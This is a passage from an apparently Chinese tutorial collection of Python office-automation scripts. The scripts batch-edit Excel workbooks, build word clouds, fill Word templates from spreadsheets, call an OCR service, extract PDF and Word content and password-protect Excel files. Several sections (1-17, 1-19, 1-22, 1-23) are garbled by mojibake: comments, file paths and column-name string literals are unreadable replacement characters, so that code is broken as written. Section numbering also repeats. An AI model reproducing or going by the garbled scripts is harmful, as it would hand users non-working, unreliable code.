    if i.startswith('~$'):  # 过滤临时文件
        continue
    file_path_name = os.path.join(file_path, i)  # 拼接路径+文件名
    workbook = app.books.open(file_path_name)  # 打开工作簿
    for j in workbook.sheets:  # 遍历工作表
        row_num = j['A1'].current_region.last_cell.row  # 获取最后一行数据的行号
        j['A2:A{}'.format(row_num)].number_format = 'm/d'  # 更改A列的格式，如果要改其他列的，要修改
    workbook.save()
    workbook.close()
app.quit()
```

## 1-16 批量重命名一个工作簿中的所有工作表

```python
#ython批量重命名一个工作簿中的所有工作表
import xlwings as xw
app = xw.App(visible = False, add_book = False)
workbook = app.books.open('C:\\Users\\Administrator\\Desktop\\aaa\\test.xlsx') #修改：工作簿所在目录
worksheets = workbook.sheets
for i in range(len(worksheets)):
    worksheets[i].name = worksheets[i].name.replace('Sheet', '表') #将表名“Sheel”改成“表”
workbook.save('C:\\Users\\Administrator\\Desktop\\aaa\\test_1.xlsx') #保存到哪里
app.quit()
```

## 1-17 批量重命名多个工作簿

```Python
#python�������������������
from pathlib import Path
folder_path = Path('C:\\Users\\Administrator\\Desktop\\bbb')
file_list = folder_path.glob('*.xlsx')  # ��ȡ���ļ��������еĹ�����,���繤������a1,a2,a3,a4
for i in file_list:
    old_file_name = i.name
    new_file_name = old_file_name.replace("a", '��')  # �滻�ɵ��ļ���������ԡ���Ϊ��β�Ĺ�����
    new_file_path = i.with_name(new_file_name)  # ���µ��ļ��������µ��ļ�·��
    i.rename(new_file_path)  # ִ������������
```

## 1-18 将文本数据可视化

```Python
import numpy as np # numpy数据处理库
import wordcloud # 词云库
from PIL import Image # 图像处理库，用于读取背景图片
import matplotlib.pyplot as plt # 图像展示库，以便在notebook中显示图片
from openpyxl import load_workbook #读取词频Excel文件
import os #获取词频Excel文件路径

#将存好的Excel词频表读取成字典
path='词频'  #文件所在文件夹
files = [path+"\\"+i for i in os.listdir(path)] #获取文件夹下的文件名,并拼接完整路径
maskImage = np.array(Image.open('background.png')) # 定义词频背景图

for file in files:
    #将词频Excel文件读取为字典
    wb = load_workbook(file)
    ws = wb.active
    wordFreq = {}
    for i in range(2,ws.max_row+1):
        word = ws["A"+str(i)].value
        freq = ws["B"+str(i)].value
        wordFreq[word] = freq    
    
    #定义词云样式
    wc = wordcloud.WordCloud(
        font_path='C:/Windows/Fonts/simhei.ttf', # 设置字体
        mask= maskImage, # 设置背景图
        max_words=500, # 最多显示词数
        max_font_size=100) # 字号最大值
    
    #生成词云图
    wc.generate_from_frequencies(wordFreq) # 从字典生成词云
    #保存图片到指定文件
    wc.to_file("词云图\\{}.png".format(file.split("\\")[1][:4]))
    #在notebook中显示词云图
    plt.imshow(wc) # 显示词云
    plt.axis('off') # 关闭坐标轴
    plt.show() # 显示图像
```

## 1-19 根据Excel中的数据批量生成Word文档

```Python
#python����excel�е�������������word�ĵ�
from docxtpl import DocxTemplate
from datetime import datetime
import time 
import datetime
import pandas as pd
import os

#zpath=os.getcwd()+'\\'
zpath=r'C:\Users\Administrator\Desktop\���н��'+'\\' #Ҫ����word��Ŀ¼�����޸�
current_file_path=zpath+r'\�ĵ����ɽ��'+str(datetime.date.today())
try:
    os.mkdir(current_file_path)
except:
    pass
tpl = DocxTemplate(zpath+'֪ͨ��.docx')  #�������֪ͨ�飬�����������

#��Щ�ֶδ�csv�л�ȡ
grade = pd.read_excel(zpath+'�ɼ���.xlsx') #������ǳɼ����������������

# stid = grade['ѧ��']  #�������ѧ�ţ������������
name = grade['����'].str.rstrip()  # str.rstrip()����ȥ�����з���������������������������
chinese = grade['����'] #����������ģ������������
math = grade['��ѧ'] #���������ѧ�������������
english = grade['Ӣ��'] #�������Ӣ������������

# �����ɼ������������֪ͨ��
num = grade.shape[0]
for i in range(num):
    context = {
       "name": name[i],
       "chinese": chinese[i],
       "math": math[i],
       "english": english[i],
       "date": time.strftime('%Y-%m-%d',time.localtime(time.time())),
#      "date": {0:%Y}��{0:%m}��{0:%d}��".format(datetime.now()),
#       "date":time.strftime('%Y-%m-%d',time.localtime(time.time()))
#       "date": datetime.now(),
    }
    tpl.render(context)
    tpl.save(current_file_path+r"\{}��֪ͨ��.docx".format(name[i])) #�������֪ͨ�飬�����������

```

## 1-20 Python调用人工智能识别表格

```Python

#获取路径下所有图片文件，并存入列表
import os
work_path = "图片\\"
pictures=[] # 存储文件夹内所有文件的路径（包括子目录内的文件）
for root, dirs, files in os.walk(work_path):
    path = [os.path.join(root, name) for name in files]
    pictures.extend(path)


from aip import AipOcr  #导入AipOcr模块，用于做文字识别
import time #时间模块
import requests #用于HTTP请求

APP_ID = '你申请的'
API_KEY = '你申请的'
SECRET_KEY = '你申请的'
client = AipOcr(APP_ID, API_KEY, SECRET_KEY)

#提交识别请求，并储存所有请求ID
for picture in pictures:
    pic = open(picture,'rb') #以二进制方式打开图片
    img = pic.read() #读取
    table = client.tableRecognitionAsync(img)    #调用表格识别模块
    request_id = table['result'][0]['request_id']
    
    #判断识别是否完成，直到完成才根据请求ID获取Excel下载路径
    result = client.getTableRecognitionResult(request_id)  #通过ID获取识别结果
    while result['result']['ret_msg'] != '已完成': #如果状态是“已完成”，才能获取下载地址
        time.sleep(2) #暂停2秒再刷新
        result = client.getTableRecognitionResult(request_id) #持续刷新，直到满足条件
        
    download_path = result['result']['result_data']
    
    #下载并将Excel文件名设为图片名
    excel_name = picture.split(".")[0] + ".xls" #让excel文件的名字与图片相同
    excel = requests.get(download_path) #抓取下载链接
    file = open(excel_name, 'wb') #新建excel文件
    file.write(excel.content) #写入excel文件并保存
```

## 1-21 一键将Word中的表格提取到Excel中

```Python
import os
from docx import Document
from openpyxl import Workbook

#获取待处理的文件的路径
path='word文件'  #文件所在文件夹
files = [path+"\\"+i for i in os.listdir(path)] #获取文件夹下的文件名,并拼接完整路径

for file in files:
    doc = Document(file)

    wb = Workbook()
    wb.remove(wb.worksheets[0])#删除工作簿自带的工作表
    for index, table in enumerate(doc.tables, start=1): #从1开始给表格编号
        ws = wb.create_sheet(f"Sheet{index}")#创建新工作表，以"Sheet" + word中表格的编号命名
        for i in range(len(table.rows)): #遍历word中表格的所有行
            row_data = [] #储存表格中每行的数据
            for j in range(len(table.columns)): #遍历word中表格的所有列
                row_data.append(table.cell(i,j).text)
            ws.append(row_data) #每取一行就写入数据到Excel表的行中
            
    wb.save("excel文件\\{}.xlsx".format(file.split("\\")[1].split(".")[0])) #保存excel文件
```

## 1-22 多个工作簿中批量生成工作表

```python
#�ڶ������������������������
import os
import xlwings as xw
file_path = 'C:\\Users\\Administrator\\Desktop\\aaa' #�����������ļ��У����޸�
file_list = os.listdir(file_path)
sheet_name = 'aaa' #Ҫ������ӵĹ��������ƣ�Ҫ�޸�
app = xw.App(visible = False, add_book = False)
for i in file_list:
    if i.startswith('~$'):
        continue
    file_paths = os.path.join(file_path, i)
    workbook = app.books.open(file_paths)
    sheet_names = [j.name for j in workbook.sheets]
    if sheet_name not in sheet_names:
        workbook.sheets.add(sheet_name)
        workbook.save()
app.quit()
```

## 1-23 将txt转存到excel中

```python
## ������Ҫ��ȡ��txt��ŵ�·��Ϊ�� C:\Users\Administrator\Desktop\a\a.txt
## ����Ϊ�� ����_x.txt

import xlwt  #����excel�ļ��Ŀ�

# ��txt�ļ�����ȡ����
with open(r'C:\Users\Administrator\Desktop\a\a.txt','r+') as title:  #'r+'��ʾ���ļ��ǽ���"��ȡ��д���ģʽ"
   layertitle = title.read()
   layertitle_list= layertitle.split()  #��ȡtxt�ļ�����Ĭ����str���ͣ��˴�����ָ��һ����Ԫ���γ��б�

# ����excel���ڴ������
workexcel = xlwt.Workbook(encoding='utf-8')        #����һ�����������
sheet = workexcel.add_sheet('layer1',cell_overwrite_ok=True)   #����������һ����Ϊlayer1��sheet  
i=0  #�б�������ʼֵΪ��һ��
j=0  #�б�������ʼֵΪ��һ��
for data in  layertitle_list:  #�������ݣ�д��excel�ļ�
    sheet.write(i,j,data)      #i��j���Ʊ�����꣬�󶥵�Ϊ��0��0��
    i=i+1          #����j=0���䣬iÿ��+1����һ�񣬱�ʾ������д��һ��
workexcel.save('����.xlsx')     #�����ļ�������Ĭ�ϱ��浽���·��������ǰ��������·��
```

## 1-24 批量从上市公司年报中获取指定内容

```python
# 批量从上市公司年报中获取指定内容已完成

# os模块： 用于处理文件路径，例如检查文件是否存在、创建目录等操作。
import os

# (定义文件夹路径)这里设置了变量’path‘,他存储了文件夹的名称’年报‘，在windows操作系统中，文件夹路径可以用反斜杠’\‘来分割目录。
path='年报'  #文件所在文件夹

# (获取文件列表)os.listdir()函数返回指定路径(这里是年报文件夹)中所有文件和文件夹的列表。
# (拼接文件路径)使用了列表推导式来遍历文件夹中的每个文件和文件夹的名称'i'，然后将他们与文件夹路径path拼接起来，
# 在windows上，文件夹路径和文件名之间要使用反斜杠’‘
files = [path+"\\"+i for i in os.listdir(path)] #获取文件夹下的文件名,并拼接完整路径的列表files。

# pdfplumber模块： 用于处理PDF文件，提取文本和表格数据。
import pdfplumber

# time模块是python标准库中的一个模块，主要用于处理与时间相关的功能。
import time

# 1.获取当前时间戳，使用time.time()函数可以获取当前时间戳。
time0= time.time()

#从字符串中提取指定首尾的文字
# 定义了一个函数Gtt_text，用于从给定的source_str中提取位于start_str和end_str之间的字符串。
# 1.start_str:要搜索的起始关键词字符串。
# 2.end_str:要搜索的结束关键词字符串。
# 3.source_str:源字符串，从里面提取目标文本
def Get_text(start_str, end_str, source_str):
    # (找到起始位置)使用find()方法在source_str中查找start_str的位置索引。
    start = source_str.find(start_str) #找到开始关键词对应的位置索引
    # (截取目标文本)
    # 如果找到了start_str，则将start索引向后移动start_str的长度，则便从其后开始搜索end_str，
    # 使用find()方法在source_str中查找end_str的位置索引，
    # 如果找到了end_str，则通过切片操作source_str[start:emd]截取start_str和end_str之间的子字符串，
    # 使用strip()方法去除截取结果的首尾空白字符(空格，制表符等)，
    # (返回结果)如果成功找到了 start_str 和 end_str，则返回截取的子字符串；否则返回 None（因为没有显式的 else 分支）。
    if start >= 0:
        start += len(start_str)
        end = source_str.find(end_str, start)#找到结束关键词对应的位置索引
        if end >= 0:
            return source_str[start:end].strip() #截取起始位置之间的字符

#定义写入txt的函数
# （函数定义和参数说明）这段代码定义了一个函数 To_txt，
# 其目的是将给定的文本数据列表 final_text 写入到指定路径的文本文件中。让我们逐步解释每个部分的功能和每行代码的作用。
# 参数解释：
# filename: 要写入的文件路径，不包括扩展名 .txt，例如 'output'。
# final_text: 要写入文件的文本数据列表，每个元素代表一行文本。
def To_txt(filename, final_text):#filename为写入文件的路径，data为要写入数据列表.
    # （打开文件）使用 open() 函数打开文件，以写入模式 'w' 打开，并指定文件编码为 UTF-8。如果文件已存在，
    # 会清空文件内容；如果文件不存在，会创建新文件。
    file = open(filename + '.txt','w',encoding="utf-8")
    # （写入文件名）将filename写入文件的第一行，并在末尾添加换行符’\n‘
    file.write(filename + "\n")
    # （逐行写入文本数据）使用 for 循环遍历 final_text 列表中的每个文本行，将其写入文件中。如果不是列表中的最后一行文本，则在每行的末尾添加换行符 \n。
    for i in range(len(final_text)):
        text = final_text[i]
        if i != len(final_text)-1: #判断是否最后一个元素
            text = text+'\n'   #若不是最后一个元素才换行
        file.write(text)
    # （延时操作）加入一个短暂的延时（0.1秒），这是为了避免在批量写入大量文件时可能出现的文件乱码问题。这种情况在一些系统或环境中可能会发生。
    time.sleep(0.1) #加入一个延时，避免批量写入出现乱码
    # （关闭文件）使用 file.close() 方法关闭文件，确保所有写入操作完成并释放文件资源。
    file.close()
    
#获取年报中的“主要业务”信息
# (遍历文件列表)这里files是一个包含文件路径的列表，每个文件都是pdf文件。
for file in files:
    # （打开pdf文件并提取文本）
    # 使用 pdfplumber 库打开 PDF 文件，并迭代处理页码从 6 到 25 的页面（索引从 0 开始）。
    # 使用 page.extract_text() 提取每一页的文本内容，并将其存储在 data 列表中。
    # 如果在任何一页中找到了 key_words（例如 "重大变化情况"），则停止提取，以节省时间和资源。
    data = []
    key_words = "重大变化情况"
    with pdfplumber.open(file) as p:
        for i in range(6,26): #公司主要业务主要年报的在8~23页范围内
            page = p.pages[i] #选页
            page_text = page.extract_text() #提取文字
            data.append(page_text) #将提取的文字加入列表
            if key_words in page_text: #到结束关键词即结束抓取信息，避免浪费时间
                break # 终止for循环        

    # (合并数据列表为大字符串)将列表data中的所有字符串元素连接成一个大字符串source_str，这个大字符串包含了从多个文档提取的所有文本内容。
    #将数据列表`data`转换成一个大字符串
    source_str = "".join(data)
    #截取文字
    # (截取所需文本段落)调用 Get_text 函数，根据 start_str 和 end_str 截取 source_str 中介于这两者之间的文本段落。
    start_str = "公司业务概要"
    end_str = "重大变化情况"
    text_wanted = Get_text(start_str, end_str, source_str)
    #去掉不需要的尾巴
    # （处理最终文本）将 text_wanted 按照换行符 \n 分割成行，并移除最后一个空行（如果存在）。这是通过 [:-1] 来实现的，它表示从列表的第一个元素到倒数第二个元素。
    final_text = text_wanted.split("\n")[:-1]
    # （构建新文件路径）这里假设 file 是一个文件路径，通过 split("\\")[1] 获取文件名部分，并移除文件扩展名（假设文件扩展名为 .pdf）。
    new_file = "主要业务\\" + file.split("\\")[1][:-4]
    # （调用写入函数）调用 To_txt 函数，将处理后的 final_text 写入到以 new_file 命名的文本文件中。
    To_txt(new_file,final_text)
    # （输出处理完成信息）打印出处理完成的提示信息，显示已处理的文件名。
    print("{} 处理完成！".format(new_file))
    
time1= time.time()
# （计算时间差）计算开始时间time0和结束时间time1之间的时间差，并将其格式化输出，这个时间差表示程序的总执行时间。
print("处理完成，共用时 {} 秒。".format(time1-time0))
```

## 1-25 用Python将上下行内容一样的单元格自动合并

```Python
#定义合并单元格的函数    
def Merge_cells(ws,target_list,start_row,col):
    '''
    ws: 是需要操作的工作表
    target_list: 是目标列表，即含有重复数据的列表
    start_row: 是开始行，即工作表中开始比对数据的行（需要将标题除开）
    col: 是需要处理数据的列
    '''
    start = 0 #开始行计数，初试值为0，对应列表中的第1个元素的位置0
    end = 0 #结束行计数，初试值为0，对应列表中的第1个元素的位置0
    reference = target_list[0] #设定基准，以列表中的第一个字符串开始
    for i in range(len(target_list)): #遍历列表
        if target_list[i] != reference: #开始比对，如果内容不同执行如下
            reference = target_list[i] #基准变成列表中下一个字符串
            end = i - 1 #列计数器
            ws.merge_cells(col + str(start + start_row) + ":"+col + str(end + start_row))
            start = end + 1
        if i == len(target_list) - 1: #遍历到最后一行，按如下操作
            end = i
            ws.merge_cells(col + str(start + start_row) + ":"+ col + str(end + start_row))

# from openpyxl import load_workbook意思是从'openpyxl'库中导入'load_workbook'函数,
# 这个函数是'openpyxl'中用来加载现有Excel文件主要函数,使用这个可以打开一个已经存储的Excel文件,
# 以便后续对其进行读取,修改或者其他操作.
#获取Excel表格中的数据
from openpyxl import load_workbook #用于读取Excel中的信息
# 加载Excel文件,获取所有工作表的名称列表,一旦加载了工作簿,你可以访问工作簿中的工作表,单元格内容等.
wb = load_workbook('产品清单.xlsx')
# 返回一个包含所有工作表名称的列表.
sheet_names = wb.get_sheet_names()
# 是一个for循环语句,用于遍历一个列表sheet_names中的每个元素,并将每个元素依次赋值给变量sheet_name
for sheet_name in sheet_names: #遍历每个工作表，抓取数据，并根据要求合并单元格
    ws = wb[sheet_name]
    customer_list = [] #客户名称
    pn_list = [] #产品编码

    for row in range(6,ws.max_row-2):
        customer = ws['B' + str(row)].value
        pn = ws['C' + str(row)].value
        customer_list.append(customer)
        pn_list.append(pn)
        
    #调用以上定义的合并单元格函数`Merge_cells`做单元格合并操作    
    start_row=6 #开始行是第六行
    Merge_cells(ws,customer_list,start_row,"B") #"B" - 客户名称是在B列
    Merge_cells(ws,pn_list,start_row,"C") #"C" - 产品编码是在C列
        
wb.save("产品清单-合并单元.xlsx")
```

## 1-16 批量对多个excel内容加密

```python
# 'os'模块提供与操作系统交互的功能，例如文件路径操作等。
# 'sys'模块提供了对python运行时环境的访问和控制。
import os, sys

# 'win32com.client'这是一个第三方模块，用于windows平台上与COM组件进行交互，
# 例如，它可以用来操作Microsoft Office应用程序，如excel,word等，通常需要在系统中，
# 安装相应的Microsoft Office 以及安装 pywin32 库来使用。
import win32com.client

# 'time'这是一个python的标准模块，提供了与时间相关的函数，例如延时等待。
import time

# 'hashlib'这是python的标准模块，用于加密散列算法的接口
import hashlib

# ’tkinter‘这是python的标准库模块，用于创建图形界面(GUL)应用程序
# tk 是 tkinter 的别名，用于引入 tkinter 模块。

# from tkinter import filedialog 引入了 tkinter 模块中的 filedialog 子模块，
# 用于创建文件对话框，让用户选择文件或保存文件,并且起别名为tk
import tkinter as tk  # 调用GUI图形模块

# 从tkinter中导入filedalog模块时，可以使用他来创建文件操作的对话框，这些对话框允许用户交互的选择文件或目录
from tkinter import filedialog

# 作用:这个方法的作用是对指定的Excel文件进行密码保护,并将其另存为新文件.
# 参数解释
# 1.'old_filename':原始Excel文件的路径,即要进行密码保护的文件.
# 2.'new_filename':另存为新的Excel文件的路径,即保存密码保护后的文件
# 3.'pwd_str':要设置的保存时的访问密码.
# 4.'pw_str':可选参数,表示打开文件的密码,即为空字符串
def pwd_xlsx(old_filename, new_filename, pwd_str, pw_str=''):

    # 这一行通过com(Component Object Model)初始化了Excel应用程序，使得Python可以与Excel进行交互
    xcl = win32com.client.Dispatch("Excel.Application")

    # 打开指定名称为‘old_filename’的Excel工作簿。
    # ‘False,False’表示不更新链接，不以只读模式打开。
    # ‘pw_str’是可选的打开密码，用于打开密码保护的工作簿。
    wb = xcl.Workbooks.Open(old_filename, False, False, None, pw_str)

    # 禁止Excel弹出的警告和确认对话框，以便程序在后台运行时不会被这些弹窗打断。
    xcl.DisplayAlerts = False

    # 将已打开的工作簿('wb')，另存为新文件名'new_filename'。
    # 'pwd_str'用作设置工作簿访问权限的密码。
    # ’‘表示不设置写保护密码。
    # 保存时可设置访问密码.
    wb.SaveAs(new_filename, None, pwd_str, '')

    # 这一行实际上是一个没有实际效果的休眠操作，可能原本是为了引入一些延迟，但是休眠时间为0秒，不会产生实际作用。
    time.sleep(0)

    # 分别关闭工作簿并退出Excel应用程序,释放资源.
    wb.Close()
    xcl.Quit()

# 作用:定义了一个名为'read_path'的函数,其作用是读取指定路径'path'下的所有文件和文件夹名称,并将他们列表形式返回.
# 定义了一个函数'read_path',他有一个参数'path',表示要读取的目录路径.
def read_path(path):

    # 使用'os.listdir()'函数列出指定路径'path'下所有文件和文件夹名称,并将结果赋值给变量'dirs'
    dirs = os.listdir(path)
    # 将包含文件和文件夹名称的列表'dirs'返回给调用者
    return dirs

# 作用:这个函数的作用是扫描指定文件夹中的所有文件,筛选出后缀为'.xlsx'或'.xls'的Excel文件,并返回这些文件的完整路径列表.
# '方法_获取文件路径'是一个函数定义,他接受一个参数'data_dir',表示要搜索大的文件夹路径.
def 方法_获取文件路径(data_dir):

    # 'os.listdir(data_dir)'返回指定目录'data'中所有文件和文件夹的名称列表,并将结果赋值给'文件集'变量
    文件集 = os.listdir(data_dir)

    # 'filename'是一个空列表,用于存储条件的excel文件路径.
    filename = []

    # 使用'for'循环遍历'文件集'中的每个文件名,将当前文件名按照'.'分割成列表'文件名分解'
    for 文件名 in 文件集:
        文件名分解 = 文件名.split('.')

        # 检查'文件名分解'列表的最后一个元素(即文件扩展名),如果是'xlsx'或'xls',则将该文件的完整路径('data_dir+文件名')添加到'dilename'列表中.
        if 文件名分解[-1] == 'xlsx' or 文件名分解[-1] == 'xls':
            excel文件路径 = (data_dir + 文件名)
            filename.append(excel文件路径)
            # print(excel文件路径)

    # 返回存储了所有符合条件的Excel文件路径的'filename'列表.
    # print(filename)
    return filename

# def main是一个常见的python函数定义，通常用于标识程序的入口点
def main():

    # 创建了一个名为root的tkinter应用程序窗口对象
    root = tk.Tk()

    # withdraw()方法将窗口隐藏起来，这样用户就看不到他，但仍然可以使用他
    root.withdraw()

    # 这行代码打开一个对话框，让用户选择一个文件夹(通过askdirectory方法)，并将用户选择的文件夹路径存储在data_dir变量中，
    # title参数设置对话框的标题，最后+‘/’是为了确保data_dir以斜杠结尾，以便后续操作处理文件路径时的一致性
    data_dir = filedialog.askdirectory(title='请选择excel所在文件夹') + '/' #文件夹里面不要有除了excel外的任何文件

    # 接下来的步骤调用一个名为方法_获取文件路径的函数,(假设是自定义的函数),并将data_dir作为参数传递给这个函数,
    # 以获取该文件夹中所有文件的路径列表，并将结果存储在file_list变量中。
    # 将源文件路径里面的文件转换成列表file_list
    file_list = 方法_获取文件路径(data_dir)

    # 这里定义了一个名为dirs的字符串变量，其值为临时文件。
    dirs = '临时文件'

    # 然后代码使用os.path.exists()函数检查当前目录下是否存在名为‘临时文件’的文件夹
    if not os.path.exists(dirs):
        # 如果不存在，使用os.makedirs()函数创建这个文件夹，注意os.makdirs(),会创建所有必须的中间目录，以确保这个路径都存在。
        os.makedirs(dirs)  # 输出文件夹

    # 将‘dirs’变量与斜杠‘/’连接起来，将结果赋值给‘result_dir’变量，这样做确保文件夹路径木为有斜杠，以便后续操作路径拼接的一致性。
    # global result_dir
    result_dir = dirs + '/'

    # 将之前选择的源文件路径‘data_dir’存储在‘source’变量中，供后续使用
    # 源文件路径
    source = data_dir

    # 这行代码打开一个文件夹选择对话框，让用户选择一个木匾文件夹，并将选择的路径存储在ob变量中，'title'参数设置对话框的变态，
    # 同样的,末尾的'+''/'确保路径末尾有斜杠,以保持路径的一致性.
    # 目标文件路径
    ob = filedialog.askdirectory(title='请选择输出另存的文件夹') + '/'

    a = 0  # 列表索引csv文件名称放进j_list列表中，索引0即为第一个csv文件名称
    j_list = read_path(source)  # 文件夹中所有的csv文件名称提取出来按顺序放进j_list列表中
    # print("---->", read_path(source))       # read_path(source) 本身就是列表
    # print("read_path(source)类型：", type(read_path(source)))
    # 建立循环对于每个文件调用excel_to_csv()

    # 这是一个循环,遍历'file_list'中的每个原色'it',每个元素应该是一个文件的路径或名称.
    for it in file_list:
        # 打印当前文件开始加密的提示信息.
        print(it + '开始加密')
        # 根据索引'a'从'j_list'中获取当前文件对应的新文件名(假设'j_list'是一个包含新文件名的列表).
        j = j_list[a]  # 按照索引逐条将csv文件名称赋值给变量j
        # print(j)
        # 给目标文件新建一些名字列表
        # 构造新文件名的完整路径,'ob'是一个文件路径的基础目录.
        new_filename = ob + '\\' + str(j)
        # 设置新的加密密码.
        pwd_str = '654321'  # 新密码自定义，需修改
        # 处理文件路径中的斜杠,将路径中的斜杠'/',替换为反斜杠'\'
        aa = it
        # print(aa.replace("/", "\\"))
        bb = ob + str(j)
        # print(bb.replace("/", "\\"))
        # 替换斜杠后的文件路径,得到'path1'和'path2'.
        path1 = aa.replace("/", "\\")
        path2 = bb.replace("/", "\\")
        # Remove_password_xlsx(aa.replace("/", "\\"), pw_str)
        # 'try'中调用pwd_xlsx(path1,path2,path3)函数,尝试使用给指定的路径加密Excel文件,
        # 如果加密过程中出现异常没捕获异常并打印加密失败的提示信息,并继续处理下一个文件.
        try:
            pwd_xlsx(path1, path2, pwd_str)
            # 在加密成功后打印加密完成的提示信息
            print(it + '加密完成')
            # 程序休眠1秒,是为了控制处理速度或等待Excel操作完成.
            time.sleep(1)

        except Exception as e:
            print(it + '加密失败，请手动设置')

            pass
        # 更新索引'a',以便在下次循环中'j_list'中获取下一个文件的新名称
        a = a + 1

# if __name__ == '__main__':是python中一个常见的约定,用来判断是否直接执行当前脚本文件(作为主程序),
# 而不是作为模块被导入到其他脚本中,这个条件通常用来确保某些代码直接执行时运行,而在被导入是不执行.
if __name__ == '__main__':
    main()

#运行时第一个对话框是原始文件所在的位置，第二次对话框选择输出文件的位置；
```

